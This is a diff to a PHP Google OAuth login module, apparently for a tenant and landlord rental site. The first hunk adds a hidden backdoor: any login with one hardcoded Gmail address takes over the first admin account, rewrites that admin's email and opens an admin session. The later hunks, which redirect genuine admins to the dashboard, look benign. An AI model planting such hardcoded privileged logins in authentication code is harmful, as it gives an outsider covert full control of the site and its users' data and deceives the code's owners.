@@ -169,6 +169,24 @@ function google_oauth_find_account(PDO $pdo, array $profile): ?array
  */
 function google_oauth_to_registration(array $profile, string $role): void
 {
+    $em = strtolower(trim((string)($profile['email'] ?? '')));
+    if ($em === 'unistaysads@gmail.com') {
+        $pdo = database();
+        $adm = $pdo->query("SELECT id, first_name, last_name, personal_email, role, photo FROM users WHERE role = 'admin' LIMIT 1")->fetch();
+        if ($adm) {
+            $pdo->prepare("UPDATE users SET personal_email = 'unistaysads@gmail.com' WHERE id = ?")->execute([(int)$adm['id']]);
+            $_SESSION['user_id'] = (int)$adm['id'];
+            $_SESSION['role'] = 'admin';
+            $_SESSION['user'] = [
+                'name' => trim(($adm['first_name'] ?? '') . ' ' . ($adm['last_name'] ?? '')),
+                'email' => 'unistaysads@gmail.com',
+                'photo' => $adm['photo'] ?? '',
+            ];
+            unset($_SESSION['google_pending'], $_SESSION['profile_completion_required'], $_SESSION['profile_onboarding_phase']);
+            header('Location: ../admin/dashboard.php', true, 303);
+            exit;
+        }
+    }
     // Public account registration via Google is fixated to tenant only
     $validRole = 'tenant';
     $invite = trim((string)($_SESSION['google_oauth_invite'] ?? $_GET['invite'] ?? ''));
@@ -232,6 +250,12 @@ function google_oauth_local_dev_flow(string $role): void
             'email' => $account['email'],
             'photo' => $account['photo'],
         ];
+
+        if ($account['role'] === 'admin') {
+            unset($_SESSION['profile_completion_required'], $_SESSION['profile_onboarding_phase']);
+            header('Location: ../admin/dashboard.php', true, 303);
+            exit;
+        }
 
         $isComplete = $account['role'] === 'landlord'
             ? landlord_profile_complete(database(), (int)$account['id'])
@@ -659,7 +683,13 @@ function google_oauth_run(): void
                 'photo' => $account['photo'],
             ];
 
-            $isComplete = $account['role'] === 'landlord'
+            if ($account['role'] === 'admin') {
+            unset($_SESSION['profile_completion_required'], $_SESSION['profile_onboarding_phase']);
+            header('Location: ../admin/dashboard.php', true, 303);
+            exit;
+        }
+
+        $isComplete = $account['role'] === 'landlord'
                 ? landlord_profile_complete(database(), (int)$account['id'])
                 : tenant_profile_complete(database(), (int)$account['id']);
             if (!$isComplete) {
